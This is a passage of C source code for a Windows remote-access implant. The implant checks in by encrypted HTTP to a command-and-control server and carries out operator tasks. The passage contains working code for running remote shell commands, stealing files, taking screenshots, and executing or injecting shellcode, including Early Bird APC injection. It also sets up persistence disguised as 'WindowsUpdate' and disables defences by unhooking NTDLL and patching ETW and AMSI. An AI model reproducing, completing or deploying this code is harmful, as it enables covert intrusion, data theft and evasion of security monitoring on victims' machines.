                pPayload[offset++] = 0xA0 | (BYTE)errLen;
            } else {
                pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)errLen;
            }
            memcpy(pPayload + offset, res->szError, errLen); offset += errLen;
        }
    }

    // 2. AES-GCM encrypt
    PBYTE pEncPayload = NULL;
    DWORD dwEncLen = 0;
    if (!AesGcmEncrypt(pSession->bSessionKey, pPayload, offset, &pEncPayload, &dwEncLen)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pPayload);

    // 3. Build envelope (heap)
    DWORD dwEnvSize = 14 + dwEncLen + 4;
    PBYTE pEnvelope = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEnvSize);
    if (!pEnvelope) { HeapFree(GetProcessHeap(), 0, pEncPayload); return FALSE; }
    DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_CHECKIN,
                                    pSession->bKeyID, pEncPayload, dwEncLen, pEnvelope);
    HeapFree(GetProcessHeap(), 0, pEncPayload);

    // 4. Base64 encode (heap)
    DWORD dwB64Size = (dwEnvLen * 4 / 3) + 8;
    PCHAR pBase64 = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwB64Size);
    if (!pBase64) { HeapFree(GetProcessHeap(), 0, pEnvelope); return FALSE; }
    Base64Encode(pEnvelope, dwEnvLen, pBase64, dwB64Size);
    HeapFree(GetProcessHeap(), 0, pEnvelope);

    // 5. Wrap in JSON (heap)
    DWORD dwJsonSize = (DWORD)strlen(pBase64) + 64;
    PCHAR pJson = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwJsonSize);
    if (!pJson) { HeapFree(GetProcessHeap(), 0, pBase64); return FALSE; }
    sprintf_s(pJson, dwJsonSize, "{\"data\":\"%s\",\"ts\":%lld}", pBase64, (long long)time(NULL));
    HeapFree(GetProcessHeap(), 0, pBase64);

    // 6. POST to /api/v1/status
    PBYTE pResponse = NULL;
    DWORD dwResponseLen = 0;
    CHAR szChkURI[32]; memcpy(szChkURI, g_EncCheckInURI, ENC_CHECKIN_URI_LEN + 1);
    DecryptString(szChkURI, ENC_CHECKIN_URI_LEN);
    BOOL bChkOk = HttpPost(szChkURI, (PBYTE)pJson, (DWORD)strlen(pJson), &pResponse, &dwResponseLen);
    ZeroString(szChkURI, ENC_CHECKIN_URI_LEN);
    HeapFree(GetProcessHeap(), 0, pJson);
    if (!bChkOk) return FALSE;

    // 7. Parse tasks from response
    if (!pResponse || dwResponseLen == 0) {
        if (ppTasks) *ppTasks = NULL;
        if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }

    PCHAR pDataStart2 = strstr((PCHAR)pResponse, "\"data\":\"");
    if (!pDataStart2) {
        HeapFree(GetProcessHeap(), 0, pResponse);
        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }
    pDataStart2 += 8;
    PCHAR pDataEnd2 = strchr(pDataStart2, '"');
    if (!pDataEnd2) {
        HeapFree(GetProcessHeap(), 0, pResponse);
        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }

    DWORD dwB64Len2 = (DWORD)(pDataEnd2 - pDataStart2);
    DWORD dwEnvBufSize = 8192;
    PBYTE pEnvBuf2 = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEnvBufSize);
    if (!pEnvBuf2) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
    DWORD dwEnvLen2 = Base64Decode(pDataStart2, dwB64Len2, pEnvBuf2, dwEnvBufSize);
    HeapFree(GetProcessHeap(), 0, pResponse);

    if (dwEnvLen2 < 14) {
        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }

    DWORD dwPayloadLen2 = (pEnvBuf2[10] << 24) | (pEnvBuf2[11] << 16) | (pEnvBuf2[12] << 8) | pEnvBuf2[13];
    if (14 + dwPayloadLen2 > dwEnvLen2) {
        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }

    PBYTE pDecrypted2 = NULL; DWORD dwDecryptedLen2 = 0;
    if (!AesGcmDecrypt(pSession->bSessionKey, pEnvBuf2 + 14, dwPayloadLen2, &pDecrypted2, &dwDecryptedLen2)) {
        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
        return TRUE;
    }
    HeapFree(GetProcessHeap(), 0, pEnvBuf2);

    C2_TASK taskBuf[16] = { 0 };
    DWORD dwParsedTasks = 0;
    MsgpackParseCheckInResponse(pDecrypted2, dwDecryptedLen2, taskBuf, 16, &dwParsedTasks);
    HeapFree(GetProcessHeap(), 0, pDecrypted2);

    if (dwParsedTasks > 0 && ppTasks) {
        *ppTasks = (PC2_TASK)HeapAlloc(GetProcessHeap(), 0, sizeof(C2_TASK) * dwParsedTasks);
        if (*ppTasks) memcpy(*ppTasks, taskBuf, sizeof(C2_TASK) * dwParsedTasks);
    } else if (ppTasks) {
        *ppTasks = NULL;
    }
    if (pdwTaskCount) *pdwTaskCount = dwParsedTasks;

    return TRUE;
}

// =============================================
// TransportCleanup
// =============================================
VOID TransportCleanup(VOID) {
    if (g_hConnect) WinHttpCloseHandle(g_hConnect);
    if (g_hSession) WinHttpCloseHandle(g_hSession);
    g_hConnect = NULL;
    g_hSession = NULL;
}

// =============================================
// Sleep with jitter
// =============================================
static VOID SleepWithJitter(DWORD dwSleepMs, DWORD dwJitterPct) {
    if (dwJitterPct > 0) {
        DWORD dwJitter = (dwSleepMs * dwJitterPct) / 100;
        DWORD dwMin = dwSleepMs - dwJitter;
        DWORD dwMax = dwSleepMs + dwJitter;
        dwSleepMs = dwMin + (GetTickCount() % (dwMax - dwMin + 1));
    }
    Sleep(dwSleepMs);
}

// =============================================
// ImplantMain - Main agent loop
// =============================================
VOID ImplantMain(PIMPLANT_CONFIG pConfig) {

    SESSION session = { 0 };

    if (!TransportInit(pConfig)) return;

    if (!TransportRegister(&session)) {
        TransportCleanup();
        return;
    }

    // Results carried between iterations: execute this cycle, send next cycle
    C2_RESULT results[16] = { 0 };
    DWORD dwResultCount = 0;

    // Main loop: check in (with pending results) → get tasks → execute → sleep → repeat
    while (TRUE) {

        // Check kill date
        if (pConfig->szKillDate[0] != '\0') {
            SYSTEMTIME st; GetSystemTime(&st);
            CHAR szNow[16];
            sprintf(szNow, "%04d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
            if (strcmp(szNow, pConfig->szKillDate) > 0) break;
        }

        PC2_TASK pTasks = NULL;
        DWORD dwTaskCount = 0;
        if (TransportCheckIn(&session, results, dwResultCount, &pTasks, &dwTaskCount)) {

            // Free previous result output buffers now that we've sent them
            for (DWORD j = 0; j < dwResultCount; j++) {
                if (results[j].pOutput && results[j].dwOutputLen > 0)
                    HeapFree(GetProcessHeap(), 0, results[j].pOutput);
            }
            memset(results, 0, sizeof(results));
            dwResultCount = 0;

            // Execute new tasks, collect results for next check-in
            for (DWORD i = 0; i < dwTaskCount && i < 16; i++) {
                C2_RESULT* res = &results[dwResultCount];
                strcpy(res->szTaskID, pTasks[i].szTaskID);
                strcpy(res->szAgentID, session.szAgentID);

                switch (pTasks[i].bType) {
                    // ── SHELL ────────────────────────────────────────
                    case TASK_SHELL: {
                        if (pTasks[i].dwArgCount > 0) {
                            CHAR szPrefix[16]; memcpy(szPrefix, g_EncCmdExe, ENC_CMD_EXE_LEN + 1);
                            DecryptString(szPrefix, ENC_CMD_EXE_LEN);
                            CHAR szCmd[1024];
                            sprintf(szCmd, "%s%s", szPrefix, pTasks[i].szArgs[0]);
                            ZeroString(szPrefix, ENC_CMD_EXE_LEN);

                            HANDLE hReadPipe, hWritePipe;
                            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                            if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
                                STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA),
                                    .dwFlags = STARTF_USESTDHANDLES,
                                    .hStdOutput = hWritePipe, .hStdError = hWritePipe };
                                PROCESS_INFORMATION pi = { 0 };
                                if (CreateProcessA(NULL, szCmd, NULL, NULL, TRUE,
                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                                    CloseHandle(hWritePipe);
                                    WaitForSingleObject(pi.hProcess, 30000);

                                    // Dynamic read loop — handles large output
                                    DWORD dwCapacity = 65536, dwTotal = 0, dwRead = 0;
                                    PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwCapacity);
                                    while (pOut && ReadFile(hReadPipe, pOut + dwTotal,
                                            dwCapacity - dwTotal - 1, &dwRead, NULL) && dwRead > 0) {
                                        dwTotal += dwRead;
                                        if (dwTotal + 4096 >= dwCapacity) {
                                            dwCapacity *= 2;
                                            PBYTE pNew = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pOut, dwCapacity);
                                            if (!pNew) break;
                                            pOut = pNew;
                                        }
                                    }
                                    res->pOutput = pOut;
                                    res->dwOutputLen = dwTotal;
                                    CloseHandle(pi.hProcess);
                                    CloseHandle(pi.hThread);
                                } else {
                                    CloseHandle(hWritePipe);
                                    strcpy(res->szError, "CreateProcess failed");
                                }
                                CloseHandle(hReadPipe);
                            }
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── CD ───────────────────────────────────────────
                    case TASK_CD: {
                        if (pTasks[i].dwArgCount > 0) {
                            if (SetCurrentDirectoryA(pTasks[i].szArgs[0])) {
                                CHAR szCwd[MAX_PATH] = {0};
                                GetCurrentDirectoryA(MAX_PATH, szCwd);
                                DWORD len = (DWORD)strlen(szCwd);
                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                                memcpy(res->pOutput, szCwd, len);
                                res->dwOutputLen = len;
                            } else {
                                sprintf(res->szError, "cd: cannot access '%s' (err %lu)",
                                    pTasks[i].szArgs[0], GetLastError());
                            }
                        } else {
                            strcpy(res->szError, "cd: path required");
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── PROCESS LIST ─────────────────────────────────
                    case TASK_PROCESSLIST: {
                        DWORD dwCap = 65536, dwOff = 0;
                        PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCap);
                        if (pOut) {
                            dwOff += sprintf((CHAR*)pOut + dwOff,
                                "%-40s %6s %6s %6s\n", "NAME", "PID", "PPID", "THREADS");
                            dwOff += sprintf((CHAR*)pOut + dwOff,
                                "%-40s %6s %6s %6s\n",
                                "----------------------------------------", "------", "------", "-------");
                            PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
                            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                            if (hSnap != INVALID_HANDLE_VALUE) {
                                if (Process32FirstW(hSnap, &pe)) {
                                    do {
                                        CHAR szName[256] = {0};
                                        WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                            szName, sizeof(szName), NULL, NULL);
                                        if (dwOff + 128 < dwCap)
                                            dwOff += sprintf((CHAR*)pOut + dwOff,
                                                "%-40s %6lu %6lu %6lu\n",
                                                szName, pe.th32ProcessID,
                                                pe.th32ParentProcessID, pe.cntThreads);
                                    } while (Process32NextW(hSnap, &pe));
                                }
                                CloseHandle(hSnap);
                            }
                            res->pOutput = pOut;
                            res->dwOutputLen = dwOff;
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── IFCONFIG ─────────────────────────────────────
                    case TASK_IFCONFIG: {
                        ULONG dwBufLen = sizeof(IP_ADAPTER_INFO);
                        PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)HeapAlloc(
                            GetProcessHeap(), 0, dwBufLen);
                        if (pInfo && GetAdaptersInfo(pInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
                            HeapFree(GetProcessHeap(), 0, pInfo);
                            pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, dwBufLen);
                        }
                        DWORD dwCap = 65536, dwOff = 0;
                        PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCap);
                        if (pInfo && pOut && GetAdaptersInfo(pInfo, &dwBufLen) == NO_ERROR) {
                            for (PIP_ADAPTER_INFO p = pInfo; p; p = p->Next) {
                                dwOff += sprintf((CHAR*)pOut + dwOff,
                                    "\n[%s] — %s\n", p->AdapterName, p->Description);
                                dwOff += sprintf((CHAR*)pOut + dwOff, "  MAC: ");
                                for (UINT m = 0; m < p->AddressLength; m++)
                                    dwOff += sprintf((CHAR*)pOut + dwOff,
                                        m ? ":%02X" : "%02X", (BYTE)p->Address[m]);
                                dwOff += sprintf((CHAR*)pOut + dwOff, "\n");
                                for (PIP_ADDR_STRING ip = &p->IpAddressList; ip; ip = ip->Next)
                                    if (ip->IpAddress.String[0] != '0')
                                        dwOff += sprintf((CHAR*)pOut + dwOff,
                                            "  IP:  %s  Mask: %s\n",
                                            ip->IpAddress.String, ip->IpMask.String);
                                if (p->GatewayList.IpAddress.String[0] != '0')
                                    dwOff += sprintf((CHAR*)pOut + dwOff,
                                        "  GW:  %s\n", p->GatewayList.IpAddress.String);
                            }
                        }
                        if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo);
                        res->pOutput = pOut;
                        res->dwOutputLen = dwOff;
                        dwResultCount++;
                        break;
                    }

                    // ── DOWNLOAD (read file → C2) ─────────────────────
                    case TASK_DOWNLOAD: {
                        if (pTasks[i].dwArgCount > 0) {
                            HANDLE hFile = CreateFileA(pTasks[i].szArgs[0], GENERIC_READ,
                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD dwSize = GetFileSize(hFile, NULL);
                                PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize + 1);
                                DWORD dwRead = 0;
                                if (pBuf && ReadFile(hFile, pBuf, dwSize, &dwRead, NULL)) {
                                    res->pOutput = pBuf;
                                    res->dwOutputLen = dwRead;
                                } else {
                                    sprintf(res->szError, "download: read failed (err %lu)", GetLastError());
                                    if (pBuf) HeapFree(GetProcessHeap(), 0, pBuf);
                                }
                                CloseHandle(hFile);
                            } else {
                                sprintf(res->szError, "download: cannot open '%s' (err %lu)",
                                    pTasks[i].szArgs[0], GetLastError());
                            }
                        } else {
                            strcpy(res->szError, "download: remote path required");
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── UPLOAD (C2 → write file) ──────────────────────
                    case TASK_UPLOAD: {
                        if (pTasks[i].dwArgCount > 0 && pTasks[i].pData && pTasks[i].dwDataLen > 0) {
                            HANDLE hFile = CreateFileA(pTasks[i].szArgs[0], GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD dwWritten = 0;
                                WriteFile(hFile, pTasks[i].pData, pTasks[i].dwDataLen, &dwWritten, NULL);
                                CloseHandle(hFile);
                                CHAR szMsg[256];
                                sprintf(szMsg, "[+] Wrote %lu bytes to %s", dwWritten, pTasks[i].szArgs[0]);
                                DWORD mlen = (DWORD)strlen(szMsg);
                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                                memcpy(res->pOutput, szMsg, mlen);
                                res->dwOutputLen = mlen;
                            } else {
                                sprintf(res->szError, "upload: cannot create '%s' (err %lu)",
                                    pTasks[i].szArgs[0], GetLastError());
                            }
                        } else {
                            strcpy(res->szError, "upload: path and data required");
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── SCREENSHOT (GDI → BMP in memory) ─────────────
                    case TASK_SCREENSHOT: {
                        HDC hScreen = GetDC(NULL);
                        HDC hDC     = CreateCompatibleDC(hScreen);
                        int cx = GetSystemMetrics(SM_CXSCREEN);
                        int cy = GetSystemMetrics(SM_CYSCREEN);
                        HBITMAP hBmp = CreateCompatibleBitmap(hScreen, cx, cy);
                        SelectObject(hDC, hBmp);
                        BitBlt(hDC, 0, 0, cx, cy, hScreen, 0, 0, SRCCOPY);

                        BITMAPINFOHEADER bmih = {0};
                        bmih.biSize        = sizeof(BITMAPINFOHEADER);
                        bmih.biWidth       = cx;
                        bmih.biHeight      = -cy;   // top-down
                        bmih.biPlanes      = 1;
                        bmih.biBitCount    = 24;
                        bmih.biCompression = BI_RGB;
                        DWORD dwRowBytes   = ((cx * 3 + 3) & ~3);
                        DWORD dwPixelBytes = dwRowBytes * cy;
                        DWORD dwFileSize   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPixelBytes;

                        PBYTE pBmp = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
                        if (pBmp) {
                            BITMAPFILEHEADER bmfh = {0};
                            bmfh.bfType      = 0x4D42; // "BM"
                            bmfh.bfSize      = dwFileSize;
                            bmfh.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                            memcpy(pBmp, &bmfh, sizeof(bmfh));
                            memcpy(pBmp + sizeof(bmfh), &bmih, sizeof(bmih));
                            GetDIBits(hDC, hBmp, 0, cy,
                                pBmp + sizeof(bmfh) + sizeof(bmih),
                                (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
                            res->pOutput    = pBmp;
                            res->dwOutputLen = dwFileSize;
                        } else {
                            strcpy(res->szError, "screenshot: alloc failed");
                        }
                        DeleteObject(hBmp);
                        DeleteDC(hDC);
                        ReleaseDC(NULL, hScreen);
                        dwResultCount++;
                        break;
                    }

                    // ── SHELLCODE (local exec via indirect syscalls) ───
                    case TASK_SHELLCODE: {
                        if (pTasks[i].pData && pTasks[i].dwDataLen > 0) {
                            PBYTE pSc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pTasks[i].dwDataLen);
                            if (pSc) {
                                memcpy(pSc, pTasks[i].pData, pTasks[i].dwDataLen);
                                BOOL bOk = LocalShellcodeExecSyscall(pSc, pTasks[i].dwDataLen);
                                PCHAR msg = bOk ? "[+] Shellcode executed in-process"
                                               : "[-] Shellcode execution failed";
                                DWORD mlen = (DWORD)strlen(msg);
                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                                memcpy(res->pOutput, msg, mlen);
                                res->dwOutputLen = mlen;
                                HeapFree(GetProcessHeap(), 0, pSc);
                            }
                        } else {
                            strcpy(res->szError, "shellcode: no payload data");
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── INJECT (remote process / early bird APC) ──────
                    case TASK_INJECT: {
                        if (pTasks[i].pData && pTasks[i].dwDataLen > 0 && pTasks[i].dwArgCount > 0) {
                            PBYTE pSc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pTasks[i].dwDataLen);
                            if (pSc) {
                                memcpy(pSc, pTasks[i].pData, pTasks[i].dwDataLen);
                                BOOL bOk = FALSE;
                                CHAR szMsg[256] = {0};

                                // Args[1] == "earlybird" → spawn+APC into a new process
                                if (pTasks[i].dwArgCount > 1 &&
                                    strcmp(pTasks[i].szArgs[1], "earlybird") == 0) {
                                    bOk = EarlyBirdApcInject(pSc, pTasks[i].dwDataLen,
                                            pTasks[i].szArgs[0]);
                                    sprintf(szMsg, bOk
                                        ? "[+] Early Bird APC injected into %s"
                                        : "[-] Early Bird APC failed (%s)", pTasks[i].szArgs[0]);
                                } else {
                                    // Remote inject: try by name first, then by PID
                                    DWORD dwPID = 0; HANDLE hProc = NULL;
                                    WCHAR wsName[256] = {0};
                                    MultiByteToWideChar(CP_UTF8, 0, pTasks[i].szArgs[0],
                                        -1, wsName, 256);
                                    if (GetRemoteProcessHandle(wsName, &dwPID, &hProc) && hProc) {
                                        bOk = InjectShellcodeSyscall(hProc, pSc, pTasks[i].dwDataLen);
                                        CloseHandle(hProc);
                                        sprintf(szMsg, bOk
                                            ? "[+] Injected into %s (PID %lu)"
                                            : "[-] Injection failed (%s)", pTasks[i].szArgs[0], dwPID);
                                    } else {
                                        DWORD pid = (DWORD)atoi(pTasks[i].szArgs[0]);
                                        if (pid > 0) {
                                            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                                            if (hProc) {
                                                bOk = InjectShellcodeSyscall(hProc, pSc,
                                                        pTasks[i].dwDataLen);
                                                CloseHandle(hProc);
                                            }
                                        }
                                        sprintf(szMsg, bOk
                                            ? "[+] Injected into PID %s"
                                            : "[-] Inject failed: process '%s' not found",
                                            pTasks[i].szArgs[0]);
                                    }
                                }
                                DWORD mlen = (DWORD)strlen(szMsg);
                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                                memcpy(res->pOutput, szMsg, mlen);
                                res->dwOutputLen = mlen;
                                HeapFree(GetProcessHeap(), 0, pSc);
                            }
                        } else {
                            strcpy(res->szError, "inject: target and shellcode data required");
                        }
                        dwResultCount++;
                        break;
                    }

                    // ── PERSIST (registry run key + startup folder) ───
                    case TASK_PERSIST: {
                        CHAR szExe[MAX_PATH] = {0};
                        GetModuleFileNameA(NULL, szExe, MAX_PATH);
                        PCHAR szMethod = (pTasks[i].dwArgCount > 0)
                            ? pTasks[i].szArgs[0] : "registry";
                        BOOL bOk = FALSE;
                        CHAR szMsg[512] = {0};

                        if (strcmp(szMethod, "registry") == 0 || strcmp(szMethod, "run") == 0) {
                            HKEY hKey;
                            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                                if (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                                    (BYTE*)szExe, (DWORD)strlen(szExe) + 1) == ERROR_SUCCESS) {
                                    bOk = TRUE;
                                    sprintf(szMsg, "[+] Registry Run key set:\n"
                                        "    HKCU\\Software\\Microsoft\\Windows\\"
                                        "CurrentVersion\\Run\\WindowsUpdate\n    = %s", szExe);
                                }
                                RegCloseKey(hKey);
                            }
                        } else if (strcmp(szMethod, "startup") == 0) {
                            CHAR szStartup[MAX_PATH] = {0};
                            SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup);
                            CHAR szDest[MAX_PATH] = {0};
                            sprintf(szDest, "%s\\WindowsUpdate.exe", szStartup);
                            if (CopyFileA(szExe, szDest, FALSE)) {
                                bOk = TRUE;
                                sprintf(szMsg, "[+] Copied to startup folder:\n    %s", szDest);
                            }
                        }

                        if (!bOk && szMsg[0] == '\0')
                            sprintf(szMsg, "[-] Persist failed (method: %s, err %lu)",
                                szMethod, GetLastError());
                        else if (!bOk)
                            strcat(szMsg, " (failed)");

                        DWORD mlen = (DWORD)strlen(szMsg);
                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                        memcpy(res->pOutput, szMsg, mlen);
                        res->dwOutputLen = mlen;
                        dwResultCount++;
                        break;
                    }

                    // ── SLEEP ────────────────────────────────────────
                    case TASK_SLEEP:
                        if (pTasks[i].dwArgCount > 0) {
                            session.dwSleepMs = (DWORD)(atoi(pTasks[i].szArgs[0]) * 1000);
                            if (pTasks[i].dwArgCount > 1)
                                session.dwJitterPct = (DWORD)atoi(pTasks[i].szArgs[1]);
                        }
                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, 3);
                        if (res->pOutput) { memcpy(res->pOutput, "ok", 2); res->dwOutputLen = 2; }
                        dwResultCount++;
                        break;

                    // ── KILL ─────────────────────────────────────────
                    case TASK_KILL:
                        TransportCleanup();
                        return;

                    // ── SYSINFO ──────────────────────────────────────
                    case TASK_SYSINFO: {
                        CHAR szInfo[1024];
                        CHAR szH[256]={0}, szU[256]={0}, szO[32]={0};
                        CHAR szA[16]={0}, szP[MAX_PATH]={0}, szI[64]={0};
                        DWORD pid = 0;
                        CollectSysInfo(szH, szU, szO, szA, &pid, szP, szI);
                        DWORD len = (DWORD)sprintf(szInfo,
                            "%s\n%s\n%s\n%s\n%lu\n%s\n%s",
                            szH, szU, szO, szA, pid, szP, szI);
                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                        memcpy(res->pOutput, szInfo, len);
                        res->dwOutputLen = len;
                        dwResultCount++;
                        break;
                    }

                    // ── EVASION ──────────────────────────────────────
                    case TASK_EVASION: {
                        BOOL bOk = RunAllEvasion();
                        PCHAR msg = bOk ? "[+] Evasion: NTDLL unhooked, ETW patched, AMSI patched"
                                        : "[-] Evasion: partial failure";
                        DWORD mlen = (DWORD)strlen(msg);
                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                        memcpy(res->pOutput, msg, mlen);
                        res->dwOutputLen = mlen;
                        dwResultCount++;
                        break;
                    }

                    default:
                        sprintf(res->szError, "unsupported task type: %d", pTasks[i].bType);
                        dwResultCount++;
                        break;
                }
            }

            if (pTasks)
                HeapFree(GetProcessHeap(), 0, pTasks);
        }

        SleepWithJitter(session.dwSleepMs, session.dwJitterPct);
    }

    TransportCleanup();
}
